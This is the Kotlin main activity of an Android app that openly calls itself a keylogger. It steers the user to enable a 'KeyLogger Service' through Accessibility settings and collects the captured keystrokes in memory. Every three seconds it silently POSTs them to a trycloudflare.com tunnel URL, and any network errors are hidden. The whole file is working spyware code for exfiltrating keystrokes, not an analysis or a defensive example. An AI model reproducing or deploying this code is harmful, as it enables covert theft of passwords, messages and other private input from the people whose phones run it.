package com.example.myapplication

import android.accessibilityservice.AccessibilityServiceInfo
import android.annotation.SuppressLint
import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import android.view.accessibility.AccessibilityManager
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch

class MainActivity : AppCompatActivity() {

    private lateinit var logTextView: TextView
    private var sendJob: Job? = null

    companion object {
        var keystrokeLogs = StringBuilder()
        @SuppressLint("StaticFieldLeak")
        var activityInstance: MainActivity? = null
    }

    @SuppressLint("MissingInflatedId")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        activityInstance = this
        logTextView = findViewById(R.id.logTextView)

        val enableButton: Button = findViewById(R.id.enable_service_button)
        enableButton.setOnClickListener {
            if (isAccessibilityServiceEnabled()) {
                Toast.makeText(this, "Service already enabled", Toast.LENGTH_SHORT).show()
            } else {
                openAccessibilitySettings()
            }
        }

        val clearButton: Button = findViewById(R.id.clearButton)
        clearButton.setOnClickListener {
            clearLogs()
        }

        if (isAccessibilityServiceEnabled()) {
            Toast.makeText(this, "Accessibility service is enabled", Toast.LENGTH_SHORT).show()
        }

        startSendingLogs()
    }

    fun updateLogDisplay(newText: String) {
        runOnUiThread {
            keystrokeLogs.append(newText).append("\n")
            logTextView.text = keystrokeLogs.toString()
        }
    }

    private fun clearLogs() {
        keystrokeLogs.clear()
        updateLogDisplay("")
    }

    private fun openAccessibilitySettings() {
        startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        Toast.makeText(this,
            "Please enable 'KeyLogger Service' in Accessibility settings",
            Toast.LENGTH_LONG).show()
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        val expectedServiceId = "$packageName/.KeyLoggerService"
        val manager = getSystemService(ACCESSIBILITY_SERVICE) as AccessibilityManager
        return manager.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK)
            .any { it.id == expectedServiceId }
    }

    private fun startSendingLogs() {
        sendJob = CoroutineScope(Dispatchers.IO).launch {
            while (isActive) {
                delay(3000)
                sendLogsToServer(keystrokeLogs.toString())
            }
        }
    }

    private fun sendLogsToServer(logs: String) {
        try {
            val url = java.net.URL("https://storm-supply-miles-heating.trycloudflare.com//upload")
            val connection = url.openConnection() as java.net.HttpURLConnection
            connection.requestMethod = "POST"
            connection.setRequestProperty("Content-Type", "text/plain")
            connection.doOutput = true

            val outputBytes = logs.toByteArray(Charsets.UTF_8)
            connection.outputStream.use { it.write(outputBytes) }

            connection.responseCode
            connection.disconnect()
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    override fun onDestroy() {
        sendJob?.cancel()
        super.onDestroy()
    }
}